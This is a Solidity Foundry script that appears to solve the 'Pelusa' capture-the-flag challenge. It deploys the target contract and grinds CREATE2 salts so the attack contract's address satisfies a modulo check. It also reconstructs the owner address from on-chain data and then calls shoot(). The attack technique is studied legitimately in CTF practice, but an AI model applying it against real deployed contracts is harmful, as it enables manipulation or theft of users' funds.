// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "../src/attacks/PelusaAttack.sol";
import "../src/Pelusa.sol";

contract PelusaScript is Script {
    address public toDeployAddress;
    uint public salt;

    address CHALLENGE_ADDR = 0xd6c70E24559D6c965348231b061B72Edd2EAc40B;
    address PELUSA_ADDR;
    address PELUSA_OWNER;

    // 2. Compute the address of the contract to be deployed
    // NOTE: _salt is a random number used to create an address
    function getAddress(bytes memory bytecode, uint _salt)
        public
        view
        returns (address)
    {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                _salt,
                keccak256(bytecode)
            )
        );

        // NOTE: cast last 20 bytes of hash to address
        return address(uint160(uint(hash)));
    }

    function checkAddress(uint from, uint to) public {
        bytes memory byteCode = getByteCode();
        for (uint i = from; i < to; i++) {
            address addr = getAddress(byteCode, i);

            console.log(addr, i, uint256(uint160(addr)) % 100);

            if (uint256(uint160(addr)) % 100 == 10) {
                toDeployAddress = addr;
                salt = i;
                break;
            }
        }
    }

    function toAddress(bytes32 val) public pure returns (address) {
        return address(uint160(uint256(val)));
    }

    function tryCreate2(bytes memory _code, uint _salt)
        public
        returns (address)
    {
        address addr;
        assembly {
            addr := create2(callvalue(), add(_code, 0x20), mload(_code), _salt)
            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }
        return addr;
    }

    function getByteCode() public returns (bytes memory) {
        bytes memory bytecode = type(PelusaAttack).creationCode;

        return abi.encodePacked(bytecode, abi.encode(PELUSA_ADDR, PELUSA_OWNER));
    }

    function run() public {
        Pelusa pelusa = new Pelusa();
        PELUSA_ADDR = address(pelusa);
        PELUSA_OWNER = address(uint160(uint256(keccak256(abi.encodePacked(address(this), blockhash(block.number))))));

        checkAddress(0, 1000);
        console.log("Final Salt %d", salt);

        bytes memory bytecode = getByteCode();
        address addr = tryCreate2(bytecode, salt);

        PelusaAttack pelusaAttack = PelusaAttack(addr);

        pelusa.shoot();
        console.log(pelusa.goals());
    }
}
